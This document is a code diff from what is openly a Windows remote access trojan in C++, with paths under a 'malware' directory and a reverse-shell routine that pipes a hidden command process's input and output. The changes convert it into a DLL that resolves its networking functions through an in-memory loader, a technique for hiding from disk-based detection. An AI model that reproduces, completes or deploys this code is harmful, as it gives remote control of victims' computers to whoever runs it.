@@ -1,5 +1,4 @@
-// cl /EHsc .\target_script.cpp /link /OUT:target_script.exe  
-//cl /EHsc /LD .\target_script.cpp /link User32.lib
+//cl /EHsc /LD .\target_code.cpp /link User32.lib
 #include <iostream>
 #include <Windows.h>
 #include <string>
@@ -16,8 +15,8 @@ SendDataFunc send_data;
 RecvDataFunc receive_data;
 RecvDataRawFunc receive_data_raw;
 
-LPCWSTR dllPath = L"C:\\malware\\Dependencies\\Networking\\network_lib.dll";
-HINSTANCE hDLL;
+// LPCWSTR dllPath = L"C:\\malware\\Dependencies\\Networking\\network_lib.dll";
+// HINSTANCE hDLL;
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
@@ -25,44 +24,44 @@ HANDLE hChildStdInRead, hChildStdInWrite;                                       
 bool connected = false;
 bool outerloop = true; bool loop = true;
 
+typedef struct INIT_PARAMS
+{
+    void* base_address;
+
+    void* (*FindExportAddress)(HMODULE, const char*);
+    void* (*MemoryLoadLibrary)(const void *, size_t);
+    void (*MemoryFreeLibrary)(void*);
+}INIT_PARAMS;
+
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 bool ExecuteCommand(const std::string& command);
 void give_command(const std::string &command);
 bool rev_shell();
+int main_thing();
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-int load_dll()
+__declspec(dllexport) int target_init(INIT_PARAMS* params)
 {
-    hDLL = LoadLibraryW(dllPath);
-    if (hDLL == NULL)
-    {
-        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
-        return EXIT_FAILURE;
-    }
-
-    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
-    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
-    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+    receive_data_raw = (RecvDataRawFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)params->FindExportAddress(reinterpret_cast<HMODULE>(params->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
 
     if (!receive_data || !send_data || !receive_data_raw)
     {
         std::cerr << "Failed to get one or more function addresses.\n";
-        FreeLibrary(hDLL);
-        return 1;
+        return 0;
     }
 
-    return 0;
+    main_thing();
+    return 1;
 }
 
-__declspec(dllexport) int main_thing()  
+int main_thing()  
 {
-    load_dll();
-
     while(outerloop)
     {
-
         Sleep(1000);
 
         // std::ifstream file("target_data.rat");
@@ -159,7 +158,6 @@ __declspec(dllexport) int main_thing()
         }
     }
 
-    FreeLibrary(hDLL);
     return 0;
 }
 
@@ -205,16 +203,14 @@ bool rev_shell()
     saAttr.bInheritHandle = TRUE;
 
     // Create pipes for child process's STDOUT.
-    if (!CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0) ||
-        !SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0))
+    if (!CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0) || !SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0))
     {
         std::cerr << "Failed to create or set up stdout pipe." << std::endl;
         return 0;
     }
 
     // Create pipes for child process's STDIN.
-    if (!CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0) ||
-        !SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0))
+    if (!CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0) || !SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0))
     {
         std::cerr << "Failed to create or set up stdin pipe." << std::endl;
         return 0;
